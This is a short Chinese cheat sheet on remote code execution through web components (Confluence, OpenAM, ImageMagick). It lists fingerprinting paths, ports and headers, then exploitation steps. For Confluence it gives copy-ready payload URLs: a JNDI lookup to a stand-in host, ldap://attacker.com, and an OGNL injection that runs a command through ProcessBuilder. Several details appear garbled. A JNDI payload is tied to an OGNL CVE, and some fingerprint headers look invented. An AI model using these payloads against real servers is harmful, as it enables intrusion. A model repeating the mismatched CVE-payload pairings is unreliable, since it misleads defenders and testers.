RCE之组件
========================================

简介
------------------------
组件漏洞是指在Web应用中使用的第三方组件存在安全漏洞，攻击者可以利用这些漏洞来执行远程代码。

常见组件漏洞
------------------------

Confluence组件
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 特征识别
    - 场景路径页面： ``/login.action`` 以及 ``/admin/users/signupoptions.action`` , ``/pages/viewpage.action`` 等
    - 特定端口： ``8090`` 以及 ``8091``
    - HTTP头信息： ``X-Confluence-Request-Time`` 以及 ``X-Confluence-Response-Time``
+ 漏洞利用
    - CVE-2021-26084: ``http://xx.com/pages/createpage.action?spaceKey=x&title=x&templateId=xxx&content=${jndi:ldap://attacker.com/a}``
    - CVE-2022-26134: ``http://xx.com/pages/createpage.action?spaceKey=x&title=x&templateId=xxx&content=${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'whoami'})).start()%3b}``

openAM组件
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 特征识别
    - 场景路径页面： ``/openam/XUI/`` 以及 ``/openam/UI/Login`` 等
    - HTTP头信息： ``X-OpenAM-Username`` 以及 ``X-OpenAM-Password``
+ 漏洞利用 
    - CVE-2021-35464

ImageMagick组件
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 介绍：ImageMagick是一个开源的 **图像处理工具** ，广泛应用于Web应用中进行 **图像处理和转换** 。然而，ImageMagick存在一些安全漏洞，攻击者可以利用这些漏洞来执行远程代码。
+ 特征识别
    - 场景路径页面： ``/convert`` 以及 ``/identify`` 等
    - HTTP头信息： ``X-ImageMagick-Version`` 以及 ``X-ImageMagick-Delegate``
+ 漏洞利用
    - 命令拼接：上传的数据包传递了ImageMagick处理图片的参数，用户可控，直接用拼接符拼接命令。
    - 处理包含恶意元数据的图片：攻击者可以上传包含恶意元数据的图片文件，当ImageMagick处理该图片时，恶意代码将被执行。